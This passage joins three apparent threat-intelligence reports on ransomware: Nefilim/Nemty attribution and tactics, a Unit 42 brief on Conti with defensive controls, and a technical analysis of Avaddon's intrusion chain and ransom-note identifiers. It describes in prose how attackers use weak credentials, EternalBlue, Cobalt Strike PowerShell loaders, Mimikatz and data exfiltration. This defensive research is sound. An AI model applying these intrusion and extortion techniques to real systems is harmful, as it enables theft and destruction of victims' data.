Locker\n\nRagnarok\n\nSunCrypt\n\nRagnar\n\nCl0p\n\nNefilim\n\nAvaddon\n\nDarkSide\n\nREvil\n\nEgregor\n\nDoppelPaymer\n\nConti 207\n\n155\n\n151\n\n139\n\n38\n\n34\n\n29\n\n25\n\n23\n\n18\n\n18\n\n12\n\n9\n\n8\n\n5\n\n3\n\nFigure 31.

Other RaaS groups \n\nsuch as REvil also expose the data of multi-billion dollar company victims. However, a large number of \n\ntheir victims are smaller companies, which makes the median revenue of the victims smaller.\n\n1000\n0 1K\n\nRagnarok\n\nAvaddon\n\nRanzy\n\nLockBit\n\nEgregor\n\nConti\n\nCuba\n\nSunCrypt\n\nBabuk\n\nDarkSide\n\nREvil\n\nDoppelPaymer\n\nRagnar\n\nMount Locker\n\nCl0p\n\nNefilim 890\n880\n\n741\n\n163\n\n162\n\n96\n\n87\n\n67\n\n61\n\n34\n\n29\n\n28\n\n21\n\n13\n\n11\n\n10\n\nFigure 34. The median revenue (in millions of US$) of ransomware victims with leaked data per RaaS as of \n\nFebruary 21, 2021\n\nAttribution \nWhile the main focus of this research is to describe the evolution of ransomware to its current, more \n\ntargeted form — using Nefilim as a prime example of this development — we must look beyond the \n\nmalware and focus on the actors behind them. Doing so allows us to better understand the driving force \n\nbehind these ransomware developments.\n\nThe change in the tactics employed by these actors is a direct response to the new, defensive approaches \n\napplied by the security industry that has brought us to where we are today. As this malware trend continues \n\nto evolve, we have also seen a shift in the activities of malicious actors in recent years — including \n\nthe actors behind the Nefilim and Nemty ransomware. We tracked the group behind these ransomware \n\nfamilies under the intrusion set “Water Roc.”\n\nAs discussed in a previous section, we believe that the Nefilim ransomware has evolved from an earlier \n\nransomware family called Nemty. Jsworm and Jingo are two underground actors we currently associate \n\nwith Water Roc activity. We have also seen both actors actively selling and supporting Nemty in the past. \n\nBased on their activities online, both actors are believed to be Russian speakers. Nemty’s code also \n\ncontained lyrics from several Russian songs and artists, as mentioned in an earlier section of this report.\n\n\n\n45 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 35. Nemty code that contains the lyrics to the Russian song “MORGENSTERN -ПОСОСИ”\n\nWe first encountered jsworm in May 2019 with the initial sales postings for RazvRAT, a remote administration \n\ntrojan (RAT), and the JSWorm ransomware affiliate program on a Russian forum called Exploit. It should \n\nbe noted that “jsworm” refers to the ransomware actors, while “JSWorm” refers to the ransomware.\n\nThe RazvRAT malware was advertised with a US$250 starting price. The amount was US$950 for the \n\nfull package, which included a hidden Virtual Network Computing (hVNC) module. Jsworm removed the \n\nlisting after a buyer appeared several days later in what appears to be a one-off sale.\n\nFigure 36. An advertisement for RazvRAT posted on an online forum\n\n\n\n46 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 37. The RazvRAT control panel \n\nThe sale of RazvRAT was followed by the emergence of the JSWorm ransomware from the same actor. \n\nAffiliates of the program had to provide their own traffic and two abused emails for inclusion in the \n\nransomware note. Profits from any successful ransom were to be divided — 30% for jsworm and 70% \n\nfor the affiliate user. Jsworm also advised his affiliates to use the cock[.]li or tutanota email providers. An \n\nearly version of this ransomware was spotted in the wild in January 2019 by several security professionals. \n\nThe JSWorm ransomware was spread through unprotected RDP configurations, email spam, malicious \n\nattachments, botnets, exploits, web injections, fake updates, and repackaged and infected installers.\n\n\n\n47 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 38. Jsworm’s JSWorm ransomware advertisement\n\nFigure 39. The JSWorm ransom note\n\nFigure 40. The JSWorm .JURASIK ransomware variant’s ransom note\n\n\n\n48 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nIn early January 2019, the blog https://id-ransomware.blogspot[.]com/2019/01/jsworm-ransomware[.]\n\nhtml listed a decrypter for version 1.0. This predates the advertising of the malware on the forums we \n\nobserved it on. This, combined with feature requests from users, led to a series of release notes and \n\nupdates to the JSWorm ransomware being posted to the Exploit forum. JSWorm ransomware continued \n\nto get updates until version 4.0 in May 2019.\n\nOn August 20, 2019, jsworm started advertising the Nemty affiliate program on Exploit. By this time, \n\njsworm had received several positive reputation points from his JSWorm ransomware program clients. \n\nA good reputation is very important for malicious actors in the criminal underground, where proving \n\none’s past activities is difficult due to the competing need for anonymity. Positive feedback from clients \n\nprovides actors a better chance to charge more for their creations and services.\n\nThe initial version of Nemty supported Windows XP and later versions. It was written in C++, with \n\nCommonwealth of Independent States (CIS) countries banned from being targeted. The profit model was \n\nsimilar to that of the earlier JSWorm ransomware, allocating 30% to jsworm and 70% to the affiliate user. \n\nThere were 25 affiliate slots available year-round.\n\nFigure 41. Jsworm’s Nemty advertisement\n\nMeanwhile, Jingo started advertising Nemty on the Russian forum XSS on September 4, 2019. The terms \n\nof the affiliate program were the same as jsworm’s with 30% for Jingo and 70% for the affiliate user. It \n\nalso had 25 affiliate slots available year-round.\n\n\n\n49 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nFigure 42. Jingo’s Nemty advertisement\n\nIn January 2020, Nemty actors created a data leak website on the dark web to publish the data of the victims \n\nwho refused to pay the ransom. This is their attempt to put additional pressure on hacked companies \n\nto pay the ransom demands. Other ransomware groups, such as DoppelPaymer and Sodinokibi, have \n\nadopted the same strategy in what has commonly become known as “Double Extortion Ransomware.”\n\nFigure 43. The Nemty ransomware payment page\n\nOn March 30, 2020, jsworm posted that Nemty was completely rewritten and renamed as Nemty Revenue \n\n3.1. The Nefilim ransomware was first spotted in the wild around this time. On April 14, 2020, jsworm \n\nannounced that the new Nemty ransomware version was shifting to private sales only, and that Nemty \n\n\n\n50 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nvictims had one week to buy decryptors. Jsworm has been inactive on the Exploit forum since September \n\n18, 2020, but we have seen continued activity from Jingo, who was seen looking for a Cobalt Strike expert \n\nin November 2020.\n\nOn November 16, 2020, Jingo posted an advertisement for Cobalt Strike using the Jabber contact \n\nfarnetwork@jabb.im. Interestingly, a user by the name Farnetwork used the same Jabber contact on \n\nan XSS forum post published on November 9, 2020. The post indicated that the user was looking for a \n\nCobalt Strike expert. We believe that Jingo and Farnetwork is the same actor using a new alias.\n\nFigure 44. Jingo’s advertisement for Cobalt Strike \n\nBased on the code similarities between Nemty and Nefilim, as well as what appear to be similar business \n\nmodels, we believe that Nemty Revenue 3.1. was, in fact, the first version of Nefilim. While we cannot \n\nstate with full confidence that either of these two actors are still actively involved in Nefilim’s operations, \n\nwe do believe that they were involved in Nefilim’s early development at the very least.\n\nTimeline: Nefilim Actors’ Activities\n\nDate Activity\n\nMay 1, 2019 jsworm posts on the Exploit forum for the first time.

A timeline of Nefilim actors’ activities\n\n\n\n52 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nConclusion\nNefilim is one ransomware family among many, but it offers a good look into the modus operandi of \n\nmodern ransomware:\n\n•\t Nefilim’s way into the network often involves the use of weak credentials on exposed RDP services or \n\nother externally facing HTTP services. In at least one case, Nefilim actors may have also used critical \n\nvulnerabilities on services, such as Citrix.60\n\n•\t Once the attackers are inside the victim environment, they behave in a manner more commonly \n\nassociated with manual targeted attacks as opposed to automated malware. They perform lateral \n\nmovement to try and find important systems, which are more likely to contain sensitive data to \n\nsteal and encrypt, in the victim network. They can also use important systems as jump-off points to \n\nkeep finding more critical data. Moving to other servers in the network also allows them to maintain \n\npersistence. These lateral movement attempts often use common admin tools to avoid detection by \n\nautomated defense tools, a technique that is called “living off the land.” \n\n•\t The attackers set up a call-home system using the Cobalt Strike software. This utilizes protocols that \n\ncan pass through firewalls, like DNS, HTTP, or HTTPS. The C&C servers that the attackers use to \n\nreceive these call-home signals are often hosted on bulletproof hosting services.\n\n•\t Once the attackers have found data worth stealing, they proceed to exfiltrate it. They may use \n\nexternal hosting sites like mega.nz for uploading a large number of files. The exfiltrated data can \n\nbe published on websites hidden behind Tor services and fast flux networks. The publication of this \n\nstolen information will be used at a later stage in an attempt to extort the victim.\n\n•\t Once the attacker is ready, they launch the ransomware payload manually. The payload encrypts the \n\ndata so that the attacker can demand a ransom. The encryption is well implemented, eliminating the \n\npossibility of creating generic decryption tools.\n\n•\t Nefilim actors target high-profile, multi-billion dollar companies located worldwide.\n\n\n\n53 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nEven though Nefilim certainly has unique aspects to it, the commonalities with other new-breed \n\nransomware families are very pronounced. For example, even though other modern ransomware families \n\ntend to publish victim data one way or another, Nefilim has a more stable way of hosting stolen data. \n\nThis could allow them to create a second way to extort money off a victim. If the first extortion attempt \n\nfails, they can threaten to publish the victim’s critical data if they do not pay. This tactic, which involves \n\nexfiltrating data prior to encryption, is a common feature of modern ransomware.\n\nSimilarly, modern ransomware families behave like targeted attacks in a way that they are not usually \n\nautomated. The vulnerability exploitation that provides them a way in is performed semi-automatically. \n\nThis means that the attackers use automated tools to scan the company’s external IP ranges. Once a \n\npossible crack is found, they try to exploit it and sneak inside. Once inside, they behave like targeted \n\nattackers by trying to move laterally looking for more targets. This contrasts with how traditional \n\nransomware compromises a victim: the initial entry is done via phishing emails and the data encryption is \n\ndone automatically just by looking for files with certain extensions.\n\nAn interesting observation that surfaced from our study is that the group of intruders who first breach \n\nthe network is not always the same group who will try to move laterally and monetize the attack. Our \n\nresearch on criminal underground websites revealed how hackers and vulnerability operators sell access \n\nto breached networks to other criminals. This disconnect between the initial network access and the \n\nransomware monetization that may come later is what we think we are seeing at play in these attacks. \n\nA substantial side effect of this multiple and disparate involvement of many groups may confuse \n\ninvestigators who are trying to piece together the attribution part of a ransomware attack. The full kill \n\nchain becomes more complex because various groups are involved. Investigators need to be more aware \n\nof this and avoid merely relying on the perfect matching of observable events to known MITRE ATT&CK \n\nmatrices.\n\nThe shift in business plans is now becoming more apparent: Ransomware affiliates are looking for bigger \n\nrevenue targets. To do that, they do not launch an attack from the outside in. Instead, they just buy \n\ntheir way in from access brokers in a gamble to make their money back by searching for sensitive data, \n\nstealing it, unleashing the ransomware, and extorting the victim.\n\nThese newer business plans have also been enabled by modernized ransomware affiliate programs. The \n\nsoftware that they use is highly professional and user-friendly for the affiliates. For example, they can log \n\nin and simply make some small changes in the configuration and the program will take care of generating \n\nsamples, communicating via email, setting the ransom amount automatically, setting the ransom amount \n\nto increase over a specified period, and processing payments.61\n\n\n\n54 | Modern Ransomware’s Double Extortion Tactics and How to Protect Enterprises Against Them\n\nModern attackers have moved on from widespread mass-mailed indiscriminate ransomware to a new \n\nmodel that is much more dangerous. Today, corporations are subject to these new APT-level ransomware \n\nattacks. In fact, they can be worse than APTs because ransomware often ends up destroying data, \n\nwhereas information-stealing APTs are almost never destructive. This puts network guardians in a difficult \n\nposition: There is a more pressing need to defend organizations against ransomware attacks, and now, \n\nthe stakes are much higher.\n\nThe current situation is as good as it gets for experts on the defensive side. This is the new benchmark — \n\nand cybersecurity and professionalism will only get better from here. Despite the apparent complexities \n\nof protecting organizations against nefarious threats, the takedown of malware giants such as Emotet \n\nproves that even the most advanced malware families can be brought down.

The group has spent more than a year attacking organizations where\nIT outages can have life-threatening consequences: hospitals, 911 dispatch carriers,\nemergency medical services and law enforcement agencies. Ireland has yet to recover from\nan attack in mid-May that prompted the shutdown of the entire information technology\nnetwork of the nation's healthcare system – prompting cancellation of appointments, the\nshutdown of X-ray systems and delays in COVID testing.\n\nConti also stands out as unreliable. We've seen the group stiff victims who pay ransoms,\nexpecting to be able to recover their data.\n\nhttps://unit42.paloaltonetworks.com/conti-ransomware-gang/\nhttps://unit42.paloaltonetworks.com/author/richard-hickman/\nhttps://unit42.paloaltonetworks.com/category/ransomware/\nhttps://unit42.paloaltonetworks.com/category/reports/\nhttps://unit42.paloaltonetworks.com/category/threat-briefs-assessments/threat-advisory-analysis/\nhttps://unit42.paloaltonetworks.com/category/unit-42/\nhttps://unit42.paloaltonetworks.com/tag/conti-ransomware/\nhttps://unit42.paloaltonetworks.com/tag/ransomware-threat-report/\nhttps://unit42.paloaltonetworks.jp/conti-ransomware-gang/\n\n\n2/7\n\nThe FBI has connected Conti to more than 400 cyberattacks against organizations\nworldwide, three-quarters of which are based in the U.S., with demands as high as $25\nmillion. This makes Conti one of the greediest groups out there.\n\nIf you think you may have been impacted, please email unit42-\ninvestigations@paloaltonetworks.com or call (866) 4-UNIT42 to get in touch with the Unit 42\nIncident Response team.\n\nConti Ransomware Overview\n\nWe’ve followed Conti for more than a year through our work helping organizations respond to\nransomware attacks. It appears to be one of many private cybercrime groups that have set\nup their operations by leveraging the booming ransomware-as-a-service (RaaS) ecosystem.\nSuch gangs obtain their foothold in the networks of their victims by purchasing access from\nother threat actors, who sell it as a commodity. They can also procure infrastructure,\nmalware, communications tools and money laundering from other RaaS providers. Most of\nthese actors use the same methods of access found in many ransomware attacks, such as\nphishing emails and exploiting unprotected internet-facing applications, the lack of multi-\nfactor authentication (MFA), as well as the typical avenues used to preserve and enhance\naccess once it’s achieved, such as through the use of Cobalt Strike or PowerShell.\n\nThese approaches are not particularly clever or sophisticated, but often they are effective.\nConti’s methodology often follows the “double extortion” approach that many leading\nransomware groups are presently using. When using double extortion, attackers will not only\nlock up a victim’s files and demand ransom, but they will also steal files and threaten to\npublish them on a website or otherwise leak them if their initial ransom demand is not met.\n\nBut Conti’s methods do have atypical elements.\n\nUsually, the more successful ransomware operators put a lot of effort into establishing and\nmaintaining some semblance of “integrity” as a way of facilitating ransom payments from\nvictims. They want to establish stellar reputations for “customer service” and for delivering on\nwhat they promise – that if you pay a ransom, your files will be decrypted (and they will not\nappear on a leak website). Yet in our experience helping clients remediate attacks, Conti has\nnot demonstrated any signs that it cares about its reputation with would-be victims.\n\nIn one recent case, Conti did not return a client’s files who had paid the ransom. This client\ngot only a small fraction of the file restorations that were promised before the Conti\nransomware representatives disappeared back into the dark web. In another case, our client\nneeded an inventory of all files accessed, so that they could notify parties whose data was\naffected. Conti agreed to share that information if a payment was made, then changed their\nminds, saying, “We do not own that data anymore. It was deleted and there is no chance to\nrestore it.” Like many ransomware gangs, Conti is constantly adapting to changes, including\nrecent heightened scrutiny by law enforcement and policy makers following high-profile\n\n\n\n3/7\n\ndisruptive attacks on the Colonial pipeline and healthcare organizations. When Ireland's\nhealthcare system refused to pay any ransom, Conti provided the agency with what it said\nwas a free decryption key. But there was a twist: The group maintained that it would still\nmake good on its \"double extortion\" threat to publish stolen data on its leak site.\n\nConclusion\n\nUnfortunately, keeping Conti out of your network often isn’t simple. A primary means of\ninfection appears to be through phishing scams, and attackers are constantly upping their\ngame in this area. While phishing emails used to be pretty easy for almost anyone to spot,\nparticularly after some awareness training, we are seeing increasingly sophisticated attacks\nin which the threat actors have done plenty of homework on their intended victims.\nSometimes they’ll send a blitz of scam emails to employees throughout an organization, and\nit takes only one to open the attachment and release the malware into the network.\n\nRansomware attacks are getting easier to unleash, and the rewards to the attackers are still\ngrowing by leaps and bounds. Accordingly, it continues to be a growth industry that will\nattract multitudes of new practitioners, and it is likely that high-profile targets will continue to\nfall.\n\nPalo Alto Networks detects and prevents Conti ransomware in the following ways:\n\nWildFire: All known samples are identified as malware.\nCortex XDR with:\n\nIndicators for Conti ransomware.\nAnti-Ransomware Module to detect Conti ransomware encryption behaviors.\nLocal Analysis detection for Conti binaries.\n\nNext-Generation Firewalls: DNS Signatures detect the known Conti ransomware\ncommand and control (C2) domains, which are also categorized as malware in\nAdvanced URL Filtering.\nAutoFocus: Tracking related activity using the Conti tag.\nUnit 42 Security Consulting: The Ransomware Readiness Assessment detects any\nhidden threats, tests for preparedness and provides remediation recommendations.\n\nAdditionally, Indicators of Compromise (IoCs) associated with Conti are available on GitHub,\nand have been published to the Unit 42 TAXII feed.\n\nCourses of Action\n\nProduct / Service Course of Action\n\nInitial Access\n\nhttps://www.paloaltonetworks.com/products/secure-the-network/wildfire\nhttps://www.paloaltonetworks.com/cortex/cortex-xdr\nhttps://www.paloaltonetworks.com/network-security/next-generation-firewall\nhttps://www.paloaltonetworks.com/network-security/advanced-url-filtering\nhttps://www.paloaltonetworks.com/cortex/autofocus\nhttps://autofocus.paloaltonetworks.com/#/tag/Unit42.Conti\nhttps://www.paloaltonetworks.com/ransomware-readiness-assessment\nhttps://github.com/pan-unit42/iocs/blob/master/Conti_IOCs.txt\nhttps://github.com/pan-unit42/iocs/tree/master/stix2-reports/report_json\n\n\n4/7\n\nThe below courses of action mitigate the following\ntechniques:\nExploit Public-Facing Application [T1190], Spearphishing\nAttachment [T1566.001]\n\nThreat Prevention† Ensure a secure Vulnerability\nProtection Profile is applied\nto all security rules allowing\ntraffic\n\nEnsure a Vulnerability Protection Profile is set to block\nattacks against critical and high vulnerabilities, and set to\ndefault on medium, low and informational vulnerabilities\n\nEnsure that antivirus profiles are set to block on all\ndecoders except 'imap' and 'pop3'\n\nEnsure a secure antivirus profile is applied to all relevant\nsecurity policies\n\nWildfire† Ensure forwarding is enabled\nfor all applications and file\ntypes in WildFire file blocking\nprofiles\n\nEnsure that WildFire file size upload limits are maximized\n\nEnsure a WildFire Analysis profile is enabled for all\nsecurity policies\n\nEnsure forwarding of decrypted content to WildFire is\nenabled\n\nEnsure all WildFire session information settings are\nenabled\n\nEnsure alerts are enabled for malicious files detected by\nWildFire\n\nEnsure 'WildFire Update Schedule' is set to download and\ninstall updates every minute\n\nCortex XSOAR Deploy XSOAR Playbook\nCortex XDR -

Among them, Avaddon stands\nout for its modus operandi and its rise.\n\nThis article describes the results of investigations conducted about this group as well as the technical analysis of a sample found in the victims\nof this ransomware.\n\nUPDATE – 11-06-21\n\nSince this article was written, a new event occurred on June 11, 2021: the Avaddon group stopped its activities.\n\nAccording to BleepingComputer[1] , its journalists received an anonymous message, claiming to be from the FBI that contained the keys to\ndecrypt the files encrypted by Avaddon.\n\nCERT-DS has indeed confirmed that the sample files collected during previous scans have been successfully decrypted.\n\nThe Avaddon website, hosted on a hidden service of the Tor network, is unavailable, which would confirm that the group’s activity has been\nshut down.\n\nThe reasons behind this development are still unknown, but it could be related to the intensified fight against ransomware, recent events\nrelated to Colonial Pipeline[2] as well as political announcements from the United States.\n\nDESCRIPTION OF AVADDON OPERATIONS\n\nThe Avaddon group was first observed in February 2020 and fully began to operate as a RaaS (Ransomware-as-a-Service) from June 2020\n[1]. The ransomware acquired notoriety following a large-scale phishing campaign in which it was distributed by the Phorpiex/Trik. In this case,\nthe fraudulent e-mails enticed victims to execute a compressed JavaScript file containing the ransomware payload. [2] [3].\n\nhttps://atos.net/en/lp/securitydive/avaddon-ransomware-analysis\n\n\n2/14\n\nAt the same time, the Avaddon group started to promote its ransomware on Russian-speaking hacker forums in order to seek new affiliates\nand increase its distribution. A month later, in August 2020, the group launched its data leak website [4].\n\nSince then, the group has quickly established itself as being able to deliver powerful, customisable and well-supported ransomware. Recent\nreports indicate a resurgence of its activity, confirmed by the recent publication of numerous repositories of data stolen from organisations in a\nwide range of sectors and countries [5] [6].\n\nTHE AVADDON RAAS\n\nRansomware-as-a-Service (RaaS) is a business model in which ransomware developers provide attackers with the whole infrastructure\nnecessary to encrypt a victim’s data. This infrastructure includes the encryption software, the payment management, the data disclosure and\nthe negotiation channel.Therefore, campaigns conducted by the Avaddon group under the RaaS model typically involve two threat actors.\nInitially, an attacker with access to an information system contacts the ransomware group. The Avaddon developers then examine the request\nas well as the credibility of the hacker’s entry point. If the request is accepted, the attackers conclude an agreement with the group to allow it to\nuse its infrastructure and the program that encrypts the data.\n\nAffiliated attackers can then use the Avaddon ransomware and pay the developers with a share of the profits generated by the ransoms paid\nby their victims (between 15 and 35% of the profits on average). The Avaddon group’s motives thus appear to be primarily lucrative, as is the\ncase with most ransomware attacks, which are usually conducted with the opportunistic intent to obtain financial gain.\n\n[1] Avaddon ransomware shuts down and releases decryption keys, BleepingComputer, https://www.\nbleepingcomputer.com/news/security/avaddon-ransomware-shuts-down-and-releases-decryption-keys/\n\n[2] Largest U.S. pipeline shuts down operations after ransomware attack, BleepingComputer, URL : https://www.\nbleepingcomputer.com/news/security/largest-us-pipeline-shuts-down-operations-after-ransomware-attack/\n\nVICTIMOLOGY\n\nThe Avaddon ransomware targets international public and private organisations in a wide range of sectors including IT services, wholesale and\nhealth. Recent victims include the American company American Bank Systems (ABS) [7], the Belgian consulting company Finalyse [8] and\nmore recently a Maltese political party [9] and the insurer Group AXA [10].\n\n\n\n3/14\n\nMajor Avaddon intrusions\n\nSources: Ransomwatch – DataBreaches – DomainTools – HornetSecurity\n\nAs a RaaS, Avaddon’s targets are therefore not chosen by its developers but by their affiliated groups. However, the group prohibits buyers\nfrom targeting countries in the Commonwealth of Independent States (CIS). In addition, the ransomware runs a script to identify its targets’\nlanguage during an intrusion. If it detects Russian or Ukrainian, it terminates its infection [11].\n\nMODUS OPERANDI\n\nAvaddon is usually distributed via phishing campaigns through e-mails containing obfuscated JPEG or ZIP attachments (which are actually\nJavaScript or Excel with macros). However, the ransomware exploits several other infection vectors, including being downloaded by other\nmalware (Smoke Loader, Phorpiex/Trik, Rigek, etc.) or distributed directly once an information system has been compromised, notably via\nRemote Desktop Protocol (RDP) and Virtual Private Networks (VPN).\n\nDuring one of our investigations, Avaddon was distributed primarily due to a lack of VPN updates and insecure passwords. The actor was then\nable to gain maximum privileges on the Active Directory domain, collect and exfiltrate sensitive data, and deploy his encryption software on\nnumerous machines because of the process.\n\nA portion of the stolen data is published on a data leak website accessible on the Deep Web to give credibility to their claims and to incite the\nvictim to pay the ransom.\n\nAvaddon’s encryption mechanism avoids critical areas of the Windows system to allow the victim to use their computer and witness the\ndamages. If the ransom is not paid within ten days (240 hours), the group publishes all the stolen data on its data leak website.\n\n\n\n4/14\n\nAvaddon Website in .onion\n Source: Ransomwatch\n\nSince January 2021, the group stated to be combining its ransomware attacks with Distributed Denial of Service (DDoS) attacks on its victims’\nWebsite to add additional pressure [12].\n\nMAJOR AVADDON UPDATES\n\nThe Avaddon ransomware has been modified and improved multiple times since the first version was released, especially regarding its\nencryption mechanism and its payload:\n\nAs early as June 2020, the developers have integrated the ability to launch the payload via Powershell to address improved detection of\nAvaddon by antivirus software;\nIn January 2021, Avaddon adds support for Windows XP and 2003;\nIn February 2021, the developers fixed a vulnerability in the ransomware encryption mechanism.\n\nThis latest update follows the release of the AvaddonDecrytper decryption tool on February 9, 2021, developed by the researcher Javier Yuste.\nHe managed to recover and analyse the ransomware encryption keys because they were stored in memory on the infected machines if they\nhad not been rebooted [13] [14].\n\nHowever, this tool allowed the Avaddon developers to realise the vulnerability of their ransomware and to implement a patch a few days later\n[15].\n\nAVADDON MAIN FEATURES (V1)\n\nAccording to SentinelOne, the first version of Avaddon includes the following features [5]:\n\nUnique payloads written in C++;\nFile encryption via AES256 + RSA2048, supporting full-file encryption & custom parameters;\nFull offline support, initial contact to C2 not required;\n“Impossible” 3rd party decryption ;\nSupport for Windows 7 and higher ;\nMulti-threaded file encryption for max performance;\nEncryption of all local and remote (and accessible) drives;\nIOCP Support for parallel file encryption;\nPersistently encrypts newly written files and newly connected media;\nAbility to spread across network shares (SMB, DFS);\nMultiple delivery options (script, PowerShell, .EXE payload .DLL);\nPayload executes as administrator ;\nEncrypts hidden files and volumes ;\nRemoves trash, Volume Shadow Copies (VSS), and other restore points;\nTermination of processes which inhibit encryption of files;\nConfigurable ransom note behaviour ;\n\nREFERENCES\n\n[1]https://labs.sentinelone.com/avaddon-raas-breaks-public-decryptor-continues-on-rampage/\n\nhttps://labs.sentinelone.com/avaddon-raas-breaks-public-decryptor-continues-on-rampage/\n\n\n5/14\n\n[2]https://appriver.com/resources/blog/june-2020/phorphiextrik-botnet-delivers-avaddon-ransomware\n\n[3]https://www.checkpoint.com/press/2020/june-2020s-most-wanted-malware-notorious-phorpiex-botnet-rises-again-doubling-its-global-\nimpact-on-organizations/\n\n[4]https://www.bleepingcomputer.com/news/security/avaddon-ransomware-launches-data-leak-site-to-extort-victims/\n\n[5] https://labs.sentinelone.com/avaddon-raas-breaks-public-decryptor-continues-on-rampage/\n\n[6]https://www.ransomwatch.org/\n\n[7]https://securityreport.com/american-bank-systems-hit-by-ransomware-attack-full-53-gb-data-dump-leaked/\n\n[8]https://www.databreaches.net/belgian-consultancy-finalyse-emerges-unscathed-from-ransomware-attack/\n\n[9]https://timesofmalta.com/articles/view/cyber-attackers-hold-pn-to-ransom-with-major-data-leak-threat.865968\n\n[10]https://www.bleepingcomputer.com/news/security/insurer-axa-hit-by-ransomware-after-dropping-support-for-ransom-payments/\n\n[11]https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Avaddon&ThreatID=2147768759\n\n[12]https://www.bleepingcomputer.com/news/security/another-ransomware-now-uses-ddos-attacks-to-force-victims-to-pay/\n\n[13]https://arxiv.org/abs/2102.04796\n\n[14]https://github.com/JavierYuste/AvaddonDecryptor\n\n[15]https://www.zdnet.com/article/free-decrypter-released-for-avaddon-ransomware-victims-aaand-its-gone\n\nTECHNICAL ANALYSIS\n\nHOW AVADDON WAS ABLE TO BREACH ITS VICTIM?\n\nAttack Description\n\nThe attacker group responsible for the attacks we investigated used the Avaddon ransomware. Knowing that Avaddon is a RaaS, different\ngroups may use the ransomware. In general, attacker groups using this malware exploit the following entry points:\n\nWeak login credentials exposed on the internet (VPN SSL, RDP, etc…);\nExploitation of a vulnerability allowing them to get a foothold in the network (Fortinet, Citrix…).\n\nFigure 1 – Attack summary\n\nAs part of this attack, the group used weak credentials exposed via a firewall SSL VPN flaw. They then proceeded to guess other accounts\nbased on what they obtained. One of the accounts they found was the domain administrator.\n\nWhen the attackers were able to recover one or more firewall accesses, it was possible for them to move around the network. Exploiting the\n“EternalBlue” vulnerability, or MS17-010[3], allowed them to gain access to one of the servers. This security flaw allows an attacker to access\nthe server without authentication, but above all it allows them to get a Super Administrator access (NT/SYSTEM).\n\nFollowing this exploitation, the attacker’s group started their lateral movement in the network. The first action was to connect to other machines\nwith the domain administrator account using remote desktop protocol (RDP).\n\nhttps://appriver.com/resources/blog/june-2020/phorphiextrik-botnet-delivers-avaddon-ransomware\nhttps://www.checkpoint.com/press/2020/june-2020s-most-wanted-malware-notorious-phorpiex-botnet-rises-again-doubling-its-global-impact-on-organizations/\nhttps://www.bleepingcomputer.com/news/security/avaddon-ransomware-launches-data-leak-site-to-extort-victims/\nhttps://labs.sentinelone.com/avaddon-raas-breaks-public-decryptor-continues-on-rampage/\nhttps://www.ransomwatch.org/\nhttps://securityreport.com/american-bank-systems-hit-by-ransomware-attack-full-53-gb-data-dump-leaked/\nhttps://www.databreaches.net/belgian-consultancy-finalyse-emerges-unscathed-from-ransomware-attack/\nhttps://timesofmalta.com/articles/view/cyber-attackers-hold-pn-to-ransom-with-major-data-leak-threat.865968\nhttps://www.bleepingcomputer.com/news/security/insurer-axa-hit-by-ransomware-after-dropping-support-for-ransom-payments/\nhttps://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Avaddon&ThreatID=2147768759\nhttps://www.bleepingcomputer.com/news/security/another-ransomware-now-uses-ddos-attacks-to-force-victims-to-pay/\nhttps://arxiv.org/abs/2102.04796\nhttps://github.com/JavierYuste/AvaddonDecryptor\nhttps://www.zdnet.com/article/free-decrypter-released-for-avaddon-ransomware-victims-aaand-its-gone/\n\n\n6/14\n\nFinally, the attacker group performed several actions on the network:\n\nDeployment of persistence using Cobalt Strike beacons;\nDeployment of a Mimikatz[4] executable used to retrieve credentials in memory;\nInternal network scan;\nSensitive data exfiltration.\n\nTTPs in use during the different attacks we investigated are referenced in a MITRE ATT&CK matrix at the end of the document.\n\nCobalt Strike Deployment\n\nCobalt Strike[5] is a Command and Control (C2) server, which allows attackers or red teamers to control infected machines. Beacons are\nmalicious programs that allow an attacker to perform actions on the compromised machines.\n\nBeacons analysed on the information system are deployed with a Powershell script.\nThis power shell script uses the “iex” cmdlet to execute scripts, binaries or binary streams. In this case, the different steps of the power shell\ndecode base64 and execute it in memory.\n\nFigure 2 – First execution stage\n\nThis script executes a second power shell script. This one also uses the “iex” cmdlet to execute the real Cobalt Strike binary load in memory:\n\nFigure 3 – Second execution stage\n\nThe final execution step is the Cobalt Strike beacon.\n\nIt was possible to extract the beacon configuration, allowing analysts to find the C2 address and other information. Finally, when all sensitive\ndata was exfiltrated, attackers deleted the Firewall event logs and deployed the “Avaddon” ransomware.\n\n[3] https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010\n[4] https://github.com/gentilkiwi/mimikatz/wiki\n[5] https://www.cobaltstrike.com/\n\nAVADDON RANSOMWARE IN USE\n\nThe analysed sample is a 32-bit PE Windows executable file called “exe_CLIENTNAME.en.exe“. It is compiled with Microsoft Visual C++ with\na compilation date/time group of March 09, 2021 18:35:19.\n\nWhen the executable is launched, the ransomware checks if it has privileged user rights. If not, it does not run.\n\nWhen files are encrypted, the ransomware drops the note “XXXXXX_readme.txt” in all folders with encrypted files. This note contains\ninstructions for victims to pay the ransom.\n\nAt the end of this note, an identifier is indicated. The attacker group to identify the infected machines uses this identifier.\n\nRCID – Machiner identifier\n\nThis identifier is represented by a base64 encoded block. Decoding this block shows two elements:\n\nFigure 4 – RCID format\n\nThe red “ID” part is a numerical value: “XXXX“. It was possible to find this value in the malware code. It can be a campaign number or a\nmalware version.\n\n\n\n7/14\n\nThe key and the initialisation vector are hardcoded in the malware:\n\nAES key (b64) : REDACTED\nIV (b64) : REDACTED\n\nThis data contains the encrypted file extension, an “RCID”, the list of mounted disks, language of the machine and its host name.\n\nThe RCID represents the unique identifier of the compromised machine and is based on an asymmetric algorithm (RSA). Below, a summary\ndiagram of the RCID generation:\n\nFigure 5 – RCID generation\n\nMalware configuration\n\nThe configuration of this ransomware is encrypted using a XOR. This operation can be 